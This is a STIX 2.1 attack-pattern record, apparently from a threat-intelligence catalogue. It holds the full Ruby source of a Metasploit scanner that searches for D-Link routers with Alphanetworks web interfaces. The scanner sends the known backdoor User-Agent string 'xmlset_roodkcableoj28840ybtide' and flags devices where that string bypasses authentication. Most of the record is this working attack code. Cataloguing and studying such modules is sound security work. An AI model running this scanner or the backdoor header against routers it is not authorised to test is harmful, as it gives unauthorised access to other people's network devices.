{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b44b384f-b8e3-42ca-923e-723327bb2262",
    "created": "2024-08-14T16:28:53.525569Z",
    "modified": "2024-08-14T16:28:53.525573Z",
    "name": "D-Link User-Agent Backdoor Scanner",
    "description": " This module attempts to find D-Link devices running Alphanetworks web interfaces affected by the backdoor found on the User-Agent header. This module has been tested successfully on a DIR-100 device with firmware version v1.13. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/dlink_user_agent_backdoor.rb",
            "external_id": "dlink_user_agent_backdoor.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.devttys0.com/2013/10/reverse-engineering-a-d-link-backdoor/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize\n    super(\n      'Name'           => 'D-Link User-Agent Backdoor Scanner',\n      'Description'    => %q{\n        This module attempts to find D-Link devices running Alphanetworks web interfaces affected\n        by the backdoor found on the User-Agent header. This module has been tested successfully\n        on a DIR-100 device with firmware version v1.13.\n      },\n      'Author'         =>\n        [\n          'Craig Heffner', # vulnerability discovery\n          'Michael Messner <devnull[at]s3cur1ty.de>', # Metasploit module\n          'juan vazquez' # minor help with msf module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'URL', 'http://www.devttys0.com/2013/10/reverse-engineering-a-d-link-backdoor/' ]\n        ],\n      # First documented in detail by Craig, but looks like it's been known\n      # (at least to the Russians :-) ) since 2010 - see post at forum.codenet.ru\n      'DisclosureDate' => \"Oct 12 2013\"\n    )\n\n  end\n\n  def is_alpha_web_server?\n    begin\n      res = send_request_cgi({'uri' => '/'})\n    rescue ::Rex::ConnectionError\n      vprint_error(\"#{rhost}:#{rport} - Failed to connect to the web server\")\n      return false\n    end\n\n    # Signatures:\n    # * httpd-alphanetworks/2.23\n    # * Alpha_webserv\n    if res and res.headers[\"Server\"] and res.headers[\"Server\"] =~ /alpha/i\n      return true\n    end\n\n    return false\n  end\n\n  def run_host(ip)\n\n    if is_alpha_web_server?\n      vprint_good(\"#{ip} - Alphanetworks web server detected\")\n    else\n      vprint_error(\"#{ip} - Alphanetworks web server doesn't detected\")\n      return\n    end\n\n    begin\n      res = send_request_cgi({\n        'uri'     => '/',\n        'method'  => 'GET',\n        'agent' => 'xmlset_roodkcableoj28840ybtide'\n      })\n    rescue ::Rex::ConnectionError\n      vprint_error(\"#{ip}:#{rport} - Failed to connect to the web server\")\n      return\n    end\n\n    # DIR-100 device with firmware version v1.13\n    # not sure if this matches on other devices\n    # TODO: Testing on other devices\n    if res and res.code == 200 and res.headers[\"Content-length\"] != 0 and res.body =~ /Home\\/bsc_internet\\.htm/\n      print_good(\"#{ip}:#{rport} - Vulnerable for authentication bypass via User-Agent Header \\\"xmlset_roodkcableoj28840ybtide\\\"\")\n    end\n\n  end\nend\n",
    "x_mitre_disclosure_date": "\"Oct 12 2013\""
}